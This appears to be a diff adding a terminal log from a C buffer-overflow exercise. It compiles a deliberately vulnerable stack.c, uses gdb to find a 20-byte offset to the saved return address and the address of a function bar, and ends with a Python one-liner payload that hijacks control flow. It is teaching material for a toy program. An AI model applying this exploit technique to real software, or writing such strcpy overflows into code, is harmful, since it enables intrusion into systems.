@@ -1,0 +1,39 @@
+$ make
+gcc -g -mpreferred-stack-boundary=2 -march=i386 -o stack stack.c
+
+$ gdb -q stack
+Reading symbols from stack...done.
+(gdb) b foo
+Breakpoint 1 at 0x8048418: file stack.c, line 11.
+(gdb) r "arg"
+Starting program: /home/lain/cvuln/stack/stack "arg"
+
+Breakpoint 1, foo (input=0xbffff678 "arg") at stack.c:11
+11	  strcpy(buf, input);
+(gdb) info frame
+Stack level 0, frame at 0xbffff464:
+ eip = 0x8048418 in foo (stack.c:11); 
+    saved eip = 0x804846a
+ called by frame at 0xbffff470
+ source language c.
+ Arglist at 0xbffff45c, args: input=0xbffff678 "arg"
+ Locals at 0xbffff45c, Previous frame's sp is 0xbffff464
+ Saved registers:
+  ebp at 0xbffff45c, eip at 0xbffff460
+(gdb) p &buf
+$1 = (char (*)[16]) 0xbffff44c
+(gdb) p 0xbffff460-0xbffff44c
+$2 = 20
+(gdb) p bar
+$3 = {void (void)} 0x8048429 <bar>
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 2385] will be killed.
+
+Quit anyway? (y or n) y
+
+$ ./stack $(python -c "print 'A'*20+'\x29\x84\04\x08'")
+I've been hacked
+Segmentation fault (core dumped)
+
